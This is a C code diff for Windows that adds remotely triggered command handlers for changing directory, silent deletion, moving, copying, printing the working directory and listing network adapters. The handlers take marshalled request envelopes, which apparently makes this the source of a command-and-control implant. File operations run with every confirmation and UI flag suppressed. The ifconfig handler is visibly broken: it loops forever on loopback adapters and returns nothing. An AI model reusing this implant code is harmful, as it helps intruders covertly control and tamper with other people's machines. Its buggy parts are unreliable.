@@ -10,7 +10,9 @@ PENVELOPE CdHandler
 	PBUFFER* pTemp = NULL;
 	LPSTR lpRespData = NULL;
 	PENVELOPE pRespEnvelope = NULL;
+	LPSTR lpErrorDesc = NULL;
 	LPSTR lpNewPath = NULL;
+	DWORD dwReturnedLength = 0;
 
 	pElement = ALLOC(sizeof(PBElement));
 	pElement->Type = Bytes;
@@ -18,17 +20,20 @@ PENVELOPE CdHandler
 
 	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
 	lpNewPath = DuplicateStrA(pTemp[0]->pBuffer, 2);
-	if (lpNewPath[lstrlenA(lpNewPath) - 1] == ':' || lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
+	if (lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
 		lstrcatA(lpNewPath, "\\");
 	}
 
 	if (!SetCurrentDirectoryA(lpNewPath)) {
-		lpRespData = ALLOC(0x100);
-		sprintf_s(lpRespData, 0x100, "SetCurrentDirectoryA failed at %s. Error code: 0x%08x", __FUNCTION__, GetLastError());
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "SetCurrentDirectoryA failed at %s.", __FUNCTIONW__);
+		goto CLEANUP;
 	}
-	else {
-		lpRespData = ALLOC(MAX_PATH);
-		GetCurrentDirectoryA(MAX_PATH, lpRespData);
+	
+	lpRespData = ALLOC(MAX_PATH);
+	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
+	if (lstrlenA(lpRespData) == 0) {
+		lpRespData = REALLOC(lpRespData, dwReturnedLength);
+		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
 	}
 
 	FreeElement(pElement);
@@ -41,8 +46,13 @@ PENVELOPE CdHandler
 	pElement->pMarshalledData = NULL;
 	pElement->cbMarshalledData = 0;
 CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
 	if (pTemp != NULL) {
-		FREE(*pTemp);
+		FreeBuffer(pTemp[0]);
 		FREE(pTemp);
 	}
 
@@ -50,11 +60,347 @@ CLEANUP:
 		FREE(lpNewPath);
 	}
 
+	if (lpRespData != NULL) {
+		FREE(lpRespData);
+	}
+
 	FreeElement(pElement);
 	return pRespEnvelope;
 }
 
-// Can kiem tra lai
+PENVELOPE RmHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement Element[3];
+	PPBElement RespElement;
+	PBUFFER* pTemp = NULL;
+	LPSTR lpRespData = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+	DWORD i = 0;
+	BOOL Force = FALSE;
+	BOOL Recursive = FALSE;
+	LPWSTR lpConvertedPath = NULL;
+	SHFILEOPSTRUCTW ShFileStruct;
+	LPSTR lpErrorDesc = NULL;
+
+	for (i = 0; i < _countof(Element); i++) {
+		Element[i] = ALLOC(sizeof(PBElement));
+		Element[i]->dwFieldIdx = i + 1;
+	}
+
+	Element[0]->Type = Bytes;
+	Element[1]->Type = Varint;
+	Element[2]->Type = Varint;
+	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	lpConvertedPath = ConvertCharToWchar(pTemp[0]->pBuffer);
+	if (pTemp[1] != 0) {
+		Recursive = TRUE;
+	}
+
+	if (pTemp[2] != 0) {
+		Force = TRUE;
+	}
+
+	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
+	ShFileStruct.wFunc = FO_DELETE;
+	ShFileStruct.pFrom = DuplicateStrW(lpConvertedPath, 2);
+	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
+	if (SHFileOperationW(&ShFileStruct)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s.", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	lpRespData = DuplicateStrA(pTemp[0]->pBuffer, 0);
+	RespElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;
+	RespElement->pMarshalledData = NULL;
+	RespElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (ShFileStruct.pFrom != NULL) {
+		FREE(ShFileStruct.pFrom);
+	}
+
+	if (pTemp != NULL) {
+		FreeBuffer(pTemp[0]);
+		FREE(pTemp);
+	}
+
+	if (lpConvertedPath != NULL) {
+		FREE(lpConvertedPath);
+	}
+
+	if (lpRespData != NULL) {
+		FREE(lpRespData);
+	}
+
+	for (i = 0; i < _countof(Element); i++) {
+		FreeElement(Element[i]);
+	}
+
+	FreeElement(RespElement);
+	return pRespEnvelope;
+}
+
+PENVELOPE MvHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement Element[2];
+	PBUFFER* pTemp = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+	DWORD i = 0;
+	LPWSTR lpSrc = NULL;
+	LPWSTR lpDest = NULL;
+	SHFILEOPSTRUCTW ShFileStruct;
+	LPSTR lpErrorDesc = NULL;
+
+	for (i = 0; i < _countof(Element); i++) {
+		Element[i] = ALLOC(sizeof(PBElement));
+		Element[i]->dwFieldIdx = i + 1;
+	}
+
+	Element[0]->Type = Bytes;
+	Element[1]->Type = Bytes;
+	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
+	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);
+
+	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
+	ShFileStruct.wFunc = FO_MOVE;
+	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
+	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
+	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
+	if (SHFileOperationW(&ShFileStruct)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s.", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (ShFileStruct.pFrom != NULL) {
+		FREE(ShFileStruct.pFrom);
+	}
+
+	if (ShFileStruct.pTo != NULL) {
+		FREE(ShFileStruct.pTo);
+	}
+
+	if (pTemp != NULL) {
+		FreeBuffer(pTemp[0]);
+		FreeBuffer(pTemp[1]);
+		FREE(pTemp);
+	}
+
+	if (lpSrc != NULL) {
+		FREE(lpSrc);
+	}
+
+	if (lpDest != NULL) {
+		FREE(lpDest);
+	}
+
+	for (i = 0; i < _countof(Element); i++) {
+		FreeElement(Element[i]);
+	}
+
+	return pRespEnvelope;
+}
+
+PENVELOPE CpHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement Element[2];
+	PPBElement RespElementList[3];
+	PPBElement RespElement = NULL;
+	PBUFFER* pTemp = NULL;
+	PENVELOPE pRespEnvelope = NULL;
+	DWORD i = 0;
+	LPWSTR lpSrc = NULL;
+	LPWSTR lpDest = NULL;
+	SHFILEOPSTRUCTW ShFileStruct;
+	LPSTR lpErrorDesc = NULL;
+
+	for (i = 0; i < _countof(Element); i++) {
+		Element[i] = ALLOC(sizeof(PBElement));
+		Element[i]->dwFieldIdx = i + 1;
+	}
+
+	Element[0]->Type = Bytes;
+	Element[1]->Type = Bytes;
+	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
+	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);
+
+	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
+	ShFileStruct.wFunc = FO_COPY;
+	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
+	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
+	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
+	if (SHFileOperationW(&ShFileStruct)) {
+		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s.", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	RespElementList[0] = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
+	RespElementList[1] = CreateBytesElement(pTemp[1]->pBuffer, lstrlenA(pTemp[1]->pBuffer), 2);
+	RespElementList[2] = CreateVarIntElement(GetFileSizeByPath(lpSrc), 3);
+	RespElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);
+
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;
+
+	RespElement->pMarshalledData = NULL;
+	RespElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
+		FREE(lpErrorDesc);
+	}
+
+	if (ShFileStruct.pFrom != NULL) {
+		FREE(ShFileStruct.pFrom);
+	}
+
+	if (ShFileStruct.pTo != NULL) {
+		FREE(ShFileStruct.pTo);
+	}
+
+	if (pTemp != NULL) {
+		FreeBuffer(pTemp[0]);
+		FreeBuffer(pTemp[1]);
+		FREE(pTemp);
+	}
+
+	if (lpSrc != NULL) {
+		FREE(lpSrc);
+	}
+
+	if (lpDest != NULL) {
+		FREE(lpDest);
+	}
+
+	for (i = 0; i < _countof(Element); i++) {
+		FreeElement(Element[i]);
+	}
+
+	FreeElement(RespElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE PwdHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement pElement = NULL;
+	LPSTR lpRespData = NULL;
+	DWORD dwReturnedLength = 0;
+	PENVELOPE pRespEnvelope = NULL;
+
+	lpRespData = ALLOC(MAX_PATH);
+	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
+	if (lstrlenA(lpRespData) == 0) {
+		lpRespData = REALLOC(lpRespData, dwReturnedLength);
+		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
+	}
+
+	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
+	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRespEnvelope->uID = pEnvelope->uID;
+	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
+	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
+	pElement->pMarshalledData = NULL;
+	pElement->cbMarshalledData = 0;
+CLEANUP:
+	if (lpRespData != NULL) {
+		FREE(lpRespData);
+	}
+
+	FreeElement(pElement);
+
+	return pRespEnvelope;
+}
+
+PENVELOPE IfconfigHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PIP_ADAPTER_ADDRESSES pAdapterInfo = NULL;
+	LPVOID lpTemp = NULL;
+	DWORD cbAdapterInfo = sizeof(IP_ADAPTER_ADDRESSES);
+	DWORD dwErrorCode = ERROR_SUCCESS;
+	PENVELOPE pResult = NULL;
+	DWORD i = 0;
+	WCHAR wszTempBuffer[0x200];
+
+	pAdapterInfo = ALLOC(cbAdapterInfo);
+	lpTemp = pAdapterInfo;
+	dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
+	if (dwErrorCode == ERROR_BUFFER_OVERFLOW) {
+		pAdapterInfo = REALLOC(pAdapterInfo, cbAdapterInfo);
+		lpTemp = pAdapterInfo;
+		dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
+		if (dwErrorCode != ERROR_SUCCESS) {
+			goto CLEANUP;
+		}
+	}
+
+	while (TRUE) {
+		if (pAdapterInfo->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
+			continue;
+		}
+
+		wprintf(L"FriendlyName: %lls\n", pAdapterInfo->FriendlyName);
+		wprintf(L"DnsSuffix: %lls\n", pAdapterInfo->DnsSuffix);
+		wprintf(L"Description: %lls\n", pAdapterInfo->Description);
+		SecureZeroMemory(wszTempBuffer, sizeof(wszTempBuffer));
+		for (i = 0; i < pAdapterInfo->PhysicalAddressLength; i++) {
+			swprintf_s(wszTempBuffer, _countof(wszTempBuffer), L"%02X-", pAdapterInfo->PhysicalAddress[i]);
+		}
+
+		wszTempBuffer[lstrlenW(wszTempBuffer) - 1] = L'\0';
+		wprintf(L"PhysicalAddress: %lls\n", wszTempBuffer);
+		pAdapterInfo->FirstUnicastAddress->Address.lpSockaddr;
+		pAdapterInfo = pAdapterInfo->Next;
+		if (pAdapterInfo == NULL) {
+			break;
+		}
+	}
+
+CLEANUP:
+	if (lpTemp != NULL) {
+		FREE(lpTemp);
+	}
+
+	return pResult;
+}
+
 PENVELOPE GetEnvHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -84,10 +430,15 @@ PENVELOPE GetEnvHandler
 	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
 	if (pTemp == NULL) {
 		lpEnvList = GetEnvironmentStringsW();
-		lpEnvList += lstrlenW(lpEnvList);
-		lpEnvList++;
-		lpEnvList += lstrlenW(lpEnvList);
-		lpEnvList++;
+		while (TRUE) {
+			if (lpEnvList[0] != L'=') {
+				break;
+			}
+
+			lpEnvList += lstrlenW(lpEnvList);
+			lpEnvList++;
+		}
+
 		lpTemp = lpEnvList;
 		while (TRUE) {
 			if (lpTemp[0] == L'\0') {
@@ -99,7 +450,7 @@ PENVELOPE GetEnvHandler
 			lpValue = StrChrA(lpKey, '=');
 			lpValue[0] = '\0';
 			lpValue++;
-			if (cEnvList > cElementList) {
+			if (cEnvList >= cElementList) {
 				cElementList = 2 * cEnvList;
 				pElementList = REALLOC(pElementList, cElementList * sizeof(PBElement));
 			}
@@ -289,10 +640,10 @@ VOID MainHandler
 		pResp = CdHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgPwdReq) {
-	
+		pResp = PwdHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgRmReq) {
-	
+		pResp = RmHandler(pEnvelope);
 	}
 	else if (pEnvelope->uType == MsgMvReq) {
 	
